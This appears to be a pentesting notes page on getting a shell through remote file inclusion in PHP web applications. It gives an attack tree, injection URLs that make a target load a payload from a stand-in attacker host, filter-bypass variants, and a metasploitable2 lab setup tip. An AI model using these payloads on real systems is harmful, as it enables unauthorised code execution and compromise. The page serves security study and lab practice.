# Shell from remote file inclusion vulnerabilities

Using remote file inclusion (RFI), an adversary can cause a web application to include a remote file. 
This is possible for web applications that dynamically include external files or scripts. Potential web security 
consequences of a successful RFI attack range from sensitive information disclosure and 
[Cross-site Scripting (XSS)](xss.md) to [remote code execution](rce.md) and, as a final result, 
full system compromise.

## Attack tree

```text
1 Inject code in remote server
    1.1 Create payload (use other extension to prevent local server from executing it)
    1.2 Start listener on hacking machine
    1.3 Add url of payload location to url of the target server
    1.4 Send commands
```

## Base patterns

```text
http://example.com/index.php?page=http://attacker.com/malicious.php
http://example.com/index.php?page=\\attacker.com\shared\malicious.php
```

The payload must be stored in a location which is accessible by the remote target (on the same network).
If having created the malicious file as, for example a `.txt` file to prevent it from being executed by the local server, add a `?`

```text
http://example.com/index.php?page=http://attacker.com/malicious.txt?
```

If filtering is used, it is unlikely this is on `.`, `/`, `\\` digits or alphanumeric. Could be filtering on `https://` 
and `http://`, so try:

```text
http://example.com/index.php?page=hTTp://attacker.com/malicious.txt?
```

## Notes

If PHP is configured to `allow_url_fopen` and `allow_url_include` (in `etc/php5/cgi/php.ini`), then the
[Local inclusion file attack](lfi.md) can be used as a remote file inclusion attack.

If playing with metasploitable2, set these two to `On` and restart apache2: `sudo /etc/init.d/apache2 restart`

## Cheatsheets

* [Path Traversal Cheat Sheet: Windows](https://www.akimbocore.com/article/windows-path-traversal-cheat-sheet/)
* [Path Traversal Cheat Sheet: Linux](https://www.akimbocore.com/article/linux-path-traversal-cheat-sheet/)

